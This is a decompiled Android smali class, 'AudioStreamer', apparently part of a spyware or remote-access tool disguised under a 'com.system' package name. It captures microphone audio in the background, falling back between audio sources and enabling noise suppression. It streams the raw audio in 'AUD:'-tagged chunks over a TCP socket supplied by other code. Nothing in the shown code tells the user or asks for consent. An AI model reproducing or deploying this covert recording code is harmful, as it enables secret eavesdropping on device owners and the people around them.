.class public Lcom/system/DroidX/utils/AudioStreamer;
.super Ljava/lang/Object;
.source "AudioStreamer.java"


# static fields
.field private static final AUDIO_FORMAT:I = 0x2

.field private static final CHANNEL_CONFIG:I = 0x10

.field private static final SAMPLE_RATE:I = 0x3e80

.field private static final TAG:Ljava/lang/String; = "AudioStreamer"


# instance fields
.field private audioRecord:Landroid/media/AudioRecord;

.field private echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

.field private executor:Ljava/util/concurrent/ExecutorService;

.field private isRecording:Z

.field private noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

.field private tcpOutputStream:Ljava/io/OutputStream;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 11
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 14
    iput-boolean v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->isRecording:Z

    .line 15
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    iput-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->executor:Ljava/util/concurrent/ExecutorService;

    return-void
.end method

.method private sendAudioData([BI)V
    .locals 3

    const-string v0, "AUD:"

    .line 128
    iget-object v1, p0, Lcom/system/DroidX/utils/AudioStreamer;->tcpOutputStream:Ljava/io/OutputStream;

    if-eqz v1, :cond_1

    iget-boolean v1, p0, Lcom/system/DroidX/utils/AudioStreamer;->isRecording:Z

    if-nez v1, :cond_0

    goto :goto_0

    .line 132
    :cond_0
    :try_start_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ":"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 133
    iget-object v1, p0, Lcom/system/DroidX/utils/AudioStreamer;->tcpOutputStream:Ljava/io/OutputStream;

    monitor-enter v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 134
    :try_start_1
    iget-object v2, p0, Lcom/system/DroidX/utils/AudioStreamer;->tcpOutputStream:Ljava/io/OutputStream;

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/io/OutputStream;->write([B)V

    .line 135
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->tcpOutputStream:Ljava/io/OutputStream;

    const/4 v2, 0x0

    invoke-virtual {v0, p1, v2, p2}, Ljava/io/OutputStream;->write([BII)V

    .line 136
    iget-object p1, p0, Lcom/system/DroidX/utils/AudioStreamer;->tcpOutputStream:Ljava/io/OutputStream;

    invoke-virtual {p1}, Ljava/io/OutputStream;->flush()V

    .line 137
    monitor-exit v1

    return-void

    :catchall_0
    move-exception p1

    monitor-exit v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw p1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method


# virtual methods
.method synthetic lambda$startStreaming$0$com-system-DroidX-utils-AudioStreamer()V
    .locals 14

    .line 37
    const-string v1, "Error stopping audio: "

    const-string v2, "AudioStreamer"

    const/16 v0, 0x10

    const/4 v3, 0x2

    const/4 v4, 0x1

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/16 v7, 0x3e80

    :try_start_0
    invoke-static {v7, v0, v3}, Landroid/media/AudioRecord;->getMinBufferSize(III)I

    move-result v0

    if-gez v0, :cond_0

    const/16 v0, 0x280

    .line 43
    :cond_0
    new-instance v7, Landroid/media/AudioRecord;

    mul-int/lit8 v12, v0, 0x4

    const/4 v8, 0x7

    const/16 v9, 0x3e80

    const/16 v10, 0x10

    const/4 v11, 0x2

    invoke-direct/range {v7 .. v12}, Landroid/media/AudioRecord;-><init>(IIIII)V

    iput-object v7, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    .line 51
    invoke-virtual {v7}, Landroid/media/AudioRecord;->getState()I

    move-result v3

    if-eq v3, v4, :cond_1

    .line 52
    const-string v3, "AudioRecord initialization failed - trying MIC source"

    invoke-static {v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 54
    new-instance v8, Landroid/media/AudioRecord;

    const/16 v11, 0x10

    move v13, v12

    const/4 v12, 0x2

    const/4 v9, 0x1

    const/16 v10, 0x3e80

    invoke-direct/range {v8 .. v13}, Landroid/media/AudioRecord;-><init>(IIIII)V

    iput-object v8, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    .line 63
    :cond_1
    iget-object v3, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v3}, Landroid/media/AudioRecord;->getState()I

    move-result v3

    if-eq v3, v4, :cond_5

    .line 64
    const-string v0, "AudioRecord initialization failed - permission may be missing"

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 65
    iput-boolean v6, p0, Lcom/system/DroidX/utils/AudioStreamer;->isRecording:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 104
    :try_start_1
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    if-eqz v0, :cond_2

    .line 105
    invoke-virtual {v0, v6}, Landroid/media/audiofx/AcousticEchoCanceler;->setEnabled(Z)I

    .line 106
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    invoke-virtual {v0}, Landroid/media/audiofx/AcousticEchoCanceler;->release()V

    .line 107
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    .line 109
    :cond_2
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    if-eqz v0, :cond_3

    .line 110
    invoke-virtual {v0, v6}, Landroid/media/audiofx/NoiseSuppressor;->setEnabled(Z)I

    .line 111
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    invoke-virtual {v0}, Landroid/media/audiofx/NoiseSuppressor;->release()V

    .line 112
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    .line 114
    :cond_3
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/media/AudioRecord;->getState()I

    move-result v0

    if-ne v0, v4, :cond_4

    .line 115
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->stop()V

    .line 116
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->release()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 119
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 121
    :cond_4
    :goto_0
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    .line 122
    iput-boolean v6, p0, Lcom/system/DroidX/utils/AudioStreamer;->isRecording:Z

    return-void

    .line 69
    :cond_5
    :try_start_2
    iget-object v3, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v3}, Landroid/media/AudioRecord;->startRecording()V

    .line 72
    invoke-static {}, Landroid/media/audiofx/AcousticEchoCanceler;->isAvailable()Z

    move-result v3

    if-eqz v3, :cond_6

    .line 73
    iget-object v3, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v3}, Landroid/media/AudioRecord;->getAudioSessionId()I

    move-result v3

    invoke-static {v3}, Landroid/media/audiofx/AcousticEchoCanceler;->create(I)Landroid/media/audiofx/AcousticEchoCanceler;

    move-result-object v3

    iput-object v3, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    if-eqz v3, :cond_6

    .line 75
    invoke-virtual {v3, v4}, Landroid/media/audiofx/AcousticEchoCanceler;->setEnabled(Z)I

    .line 76
    const-string v3, "Echo cancellation enabled"

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 81
    :cond_6
    invoke-static {}, Landroid/media/audiofx/NoiseSuppressor;->isAvailable()Z

    move-result v3

    if-eqz v3, :cond_7

    .line 82
    iget-object v3, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v3}, Landroid/media/AudioRecord;->getAudioSessionId()I

    move-result v3

    invoke-static {v3}, Landroid/media/audiofx/NoiseSuppressor;->create(I)Landroid/media/audiofx/NoiseSuppressor;

    move-result-object v3

    iput-object v3, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    if-eqz v3, :cond_7

    .line 84
    invoke-virtual {v3, v4}, Landroid/media/audiofx/NoiseSuppressor;->setEnabled(Z)I

    .line 85
    const-string v3, "Noise suppression enabled"

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 89
    :cond_7
    new-array v3, v0, [B

    .line 91
    const-string v7, "Audio streaming started in background"

    invoke-static {v2, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 93
    :cond_8
    :goto_1
    iget-boolean v7, p0, Lcom/system/DroidX/utils/AudioStreamer;->isRecording:Z

    if-eqz v7, :cond_9

    iget-object v7, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    if-eqz v7, :cond_9

    .line 94
    invoke-virtual {v7, v3, v6, v0}, Landroid/media/AudioRecord;->read([BII)I

    move-result v7

    if-lez v7, :cond_8

    .line 96
    invoke-direct {p0, v3, v7}, Lcom/system/DroidX/utils/AudioStreamer;->sendAudioData([BI)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_1

    .line 104
    :cond_9
    :try_start_3
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    if-eqz v0, :cond_a

    .line 105
    invoke-virtual {v0, v6}, Landroid/media/audiofx/AcousticEchoCanceler;->setEnabled(Z)I

    .line 106
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    invoke-virtual {v0}, Landroid/media/audiofx/AcousticEchoCanceler;->release()V

    .line 107
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    .line 109
    :cond_a
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    if-eqz v0, :cond_b

    .line 110
    invoke-virtual {v0, v6}, Landroid/media/audiofx/NoiseSuppressor;->setEnabled(Z)I

    .line 111
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    invoke-virtual {v0}, Landroid/media/audiofx/NoiseSuppressor;->release()V

    .line 112
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    .line 114
    :cond_b
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    if-eqz v0, :cond_e

    invoke-virtual {v0}, Landroid/media/AudioRecord;->getState()I

    move-result v0

    if-ne v0, v4, :cond_e

    .line 115
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->stop()V

    .line 116
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->release()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_3

    :catch_1
    move-exception v0

    .line 119
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    goto :goto_2

    :catchall_0
    move-exception v0

    move-object v3, v0

    goto :goto_4

    :catch_2
    move-exception v0

    .line 101
    :try_start_4
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Audio streaming error: "

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 104
    :try_start_5
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    if-eqz v0, :cond_c

    .line 105
    invoke-virtual {v0, v6}, Landroid/media/audiofx/AcousticEchoCanceler;->setEnabled(Z)I

    .line 106
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    invoke-virtual {v0}, Landroid/media/audiofx/AcousticEchoCanceler;->release()V

    .line 107
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    .line 109
    :cond_c
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    if-eqz v0, :cond_d

    .line 110
    invoke-virtual {v0, v6}, Landroid/media/audiofx/NoiseSuppressor;->setEnabled(Z)I

    .line 111
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    invoke-virtual {v0}, Landroid/media/audiofx/NoiseSuppressor;->release()V

    .line 112
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    .line 114
    :cond_d
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    if-eqz v0, :cond_e

    invoke-virtual {v0}, Landroid/media/AudioRecord;->getState()I

    move-result v0

    if-ne v0, v4, :cond_e

    .line 115
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->stop()V

    .line 116
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->release()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    goto :goto_3

    :catch_3
    move-exception v0

    .line 119
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    :goto_2
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 121
    :cond_e
    :goto_3
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    .line 122
    iput-boolean v6, p0, Lcom/system/DroidX/utils/AudioStreamer;->isRecording:Z

    return-void

    .line 104
    :goto_4
    :try_start_6
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    if-eqz v0, :cond_f

    .line 105
    invoke-virtual {v0, v6}, Landroid/media/audiofx/AcousticEchoCanceler;->setEnabled(Z)I

    .line 106
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    invoke-virtual {v0}, Landroid/media/audiofx/AcousticEchoCanceler;->release()V

    .line 107
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    .line 109
    :cond_f
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    if-eqz v0, :cond_10

    .line 110
    invoke-virtual {v0, v6}, Landroid/media/audiofx/NoiseSuppressor;->setEnabled(Z)I

    .line 111
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    invoke-virtual {v0}, Landroid/media/audiofx/NoiseSuppressor;->release()V

    .line 112
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    .line 114
    :cond_10
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    if-eqz v0, :cond_11

    invoke-virtual {v0}, Landroid/media/AudioRecord;->getState()I

    move-result v0

    if-ne v0, v4, :cond_11

    .line 115
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->stop()V

    .line 116
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->release()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    goto :goto_5

    :catch_4
    move-exception v0

    .line 119
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 121
    :cond_11
    :goto_5
    iput-object v5, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    .line 122
    iput-boolean v6, p0, Lcom/system/DroidX/utils/AudioStreamer;->isRecording:Z

    .line 123
    throw v3
.end method

.method public setOutputStream(Ljava/io/OutputStream;)V
    .locals 0

    .line 27
    iput-object p1, p0, Lcom/system/DroidX/utils/AudioStreamer;->tcpOutputStream:Ljava/io/OutputStream;

    return-void
.end method

.method public startStreaming()V
    .locals 2

    .line 31
    iget-boolean v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->isRecording:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    const/4 v0, 0x1

    .line 33
    iput-boolean v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->isRecording:Z

    .line 35
    iget-object v0, p0, Lcom/system/DroidX/utils/AudioStreamer;->executor:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lcom/system/DroidX/utils/AudioStreamer$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/system/DroidX/utils/AudioStreamer$$ExternalSyntheticLambda0;-><init>(Lcom/system/DroidX/utils/AudioStreamer;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V

    return-void
.end method

.method public stopStreaming()V
    .locals 5

    .line 144
    const-string v0, "AudioStreamer"

    .line 0
    const-string v1, "Error stopping audio: "

    const/4 v2, 0x0

    .line 144
    iput-boolean v2, p0, Lcom/system/DroidX/utils/AudioStreamer;->isRecording:Z

    const/4 v3, 0x0

    .line 146
    :try_start_0
    iget-object v4, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    if-eqz v4, :cond_0

    .line 147
    invoke-virtual {v4, v2}, Landroid/media/audiofx/AcousticEchoCanceler;->setEnabled(Z)I

    .line 148
    iget-object v4, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    invoke-virtual {v4}, Landroid/media/audiofx/AcousticEchoCanceler;->release()V

    .line 149
    iput-object v3, p0, Lcom/system/DroidX/utils/AudioStreamer;->echoCanceler:Landroid/media/audiofx/AcousticEchoCanceler;

    .line 151
    :cond_0
    iget-object v4, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    if-eqz v4, :cond_1

    .line 152
    invoke-virtual {v4, v2}, Landroid/media/audiofx/NoiseSuppressor;->setEnabled(Z)I

    .line 153
    iget-object v2, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    invoke-virtual {v2}, Landroid/media/audiofx/NoiseSuppressor;->release()V

    .line 154
    iput-object v3, p0, Lcom/system/DroidX/utils/AudioStreamer;->noiseSuppressor:Landroid/media/audiofx/NoiseSuppressor;

    .line 156
    :cond_1
    iget-object v2, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    if-eqz v2, :cond_2

    invoke-virtual {v2}, Landroid/media/AudioRecord;->getState()I

    move-result v2

    const/4 v4, 0x1

    if-ne v2, v4, :cond_2

    .line 157
    iget-object v2, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v2}, Landroid/media/AudioRecord;->stop()V

    .line 158
    iget-object v2, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    invoke-virtual {v2}, Landroid/media/AudioRecord;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 163
    :cond_2
    :goto_0
    iput-object v3, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    goto :goto_1

    :catchall_0
    move-exception v0

    goto :goto_2

    :catch_0
    move-exception v2

    .line 161
    :try_start_1
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    .line 165
    :goto_1
    const-string v1, "Audio streaming stopped"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    .line 163
    :goto_2
    iput-object v3, p0, Lcom/system/DroidX/utils/AudioStreamer;->audioRecord:Landroid/media/AudioRecord;

    .line 164
    throw v0
.end method
